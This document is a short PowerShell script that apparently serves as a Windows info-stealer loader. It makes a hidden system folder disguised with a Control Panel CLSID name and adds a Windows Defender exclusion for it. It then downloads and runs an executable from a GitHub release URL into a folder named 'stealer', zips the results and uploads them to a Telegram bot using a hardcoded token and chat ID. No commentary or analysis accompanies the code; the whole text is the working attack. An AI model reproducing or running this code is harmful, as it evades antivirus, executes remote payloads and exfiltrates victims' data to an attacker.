
$rdir = "$env:SystemDrive\ProgramData\Loader"
$dir = "$rdir..{21EC2020-3AEA-1069-A2DD-08002B30309D}"
$startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir
attrib +h +s $dir

$stealer = "$dir\stealer"
New-Item -ItemType Directory -Path $stealer


$url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
$output = "$stealer\loader.exe"

if (Test-Path -Path $output) {
    Write-Host "hello"
} else {
    Invoke-WebRequest -Uri $url -OutFile $output
}
cd $stealer
call $output
$archivePath=[System.IO.Path]::GetTempPath()+$userName+'.zip'
Compress-Archive -Path ($stealer) -DestinationPath $archivePath -Force
$botToken="7487418347:AAHo0dKeo0c-nZAiN9ZgiVPbyp4xTSdsV2E"
$chatId="7056174540"
$telegramApiUrl="https://api.telegram.org/bot$botToken/sendDocument"
$multipartContent=New-Object System.Net.Http.MultipartFormDataContent
$multipartContent.Add((New-Object System.Net.Http.StringContent($chatId)),"chat_id")
$multipartContent.Add((New-Object System.Net.Http.StreamContent([System.IO.File]::OpenRead($archivePath))),"document",[System.IO.Path]::GetFileName($archivePath))
(New-Object System.Net.Http.HttpClient).PostAsync($telegramApiUrl,$multipartContent).Result
